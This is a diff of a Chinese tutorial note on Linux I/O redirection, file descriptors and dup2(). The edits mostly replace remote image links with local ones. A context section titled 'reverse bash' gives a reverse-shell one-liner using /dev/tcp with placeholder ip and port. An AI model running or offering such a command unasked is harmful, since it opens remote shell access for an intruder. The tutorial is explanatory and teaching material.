@@ -1,6 +1,6 @@
 > I/O重定向基础知识为文件描述符
 
-![webp](https://upload-images.jianshu.io/upload_images/2322338-e9e60a745921ba84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700/format/webp)
+![c6e81a03-55a3-43ee-b175-9d9d7b6d23c8](linux I-O重定向_files/c6e81a03-55a3-43ee-b175-9d9d7b6d23c8)
 文件描述符是文件描述表的下标，文件描述表中存的指向文件结构体的指针。
 ```
 struct fd { 
@@ -20,15 +20,10 @@ FILE* stderr
 2>&1
 ```
 在重定向前，是这样的：
-
 ![8bbdb068-98af-4e16-ac68-13f6b9f14d52.png](linux I-O重定向_files/8bbdb068-98af-4e16-ac68-13f6b9f14d52.png)
-
 重定向之后，是这样的：
-
 ![61d2f081-841b-4faf-bac5-861ef904c67e.png](linux I-O重定向_files/61d2f081-841b-4faf-bac5-861ef904c67e.png)
-
 这是因为`2>&1`是通过`dup2()`这个系统调用实现的。
-
 **int dup2(int oldfd, int newfd); **:
 ```
 dup2() create a copy of the file descriptor oldfd. After a successful return from dup() or dup2(), the old and new file descriptors may be used interchangeably. They refer to the same open file description (see open(2)) and thus share file offset and file status flags; for example, if the file offset is modified by using lseek(2) on one of the descriptors, the offset is also changed for the other.
@@ -37,14 +32,13 @@ dup2() create a copy of the file descriptor oldfd. After a successful return fro
 > 这儿关于dup2()的实现推荐一个文章[Linux内核分析：dup、dup2的实现](https://www.cnblogs.com/lit10050528/p/6206235.html)，源码非常清楚了，把老的指针复制(赋值)给新的
 
 找到一个非常漂亮的图
-![164957289.png](http://blog.51cto.com/attachment/201211/164957289.png)
+![f1ce6789-2172-4d44-af04-11d93c860026.png](linux I-O重定向_files/f1ce6789-2172-4d44-af04-11d93c860026.png)
 ## 反弹bash
 ```
 bash > /dev/tcp/ip/port 0<&1
 ```
 先是`standout`重定向到`/dev/tcp/ip/port`，接着`standin`的再被复制成`standout`
 > 这儿说的standin,standout并非是指针，而是0,1的默认名称
-
 |Handle|Name|Description|
 | - | - | - |
 |0|stdin|标准输入|
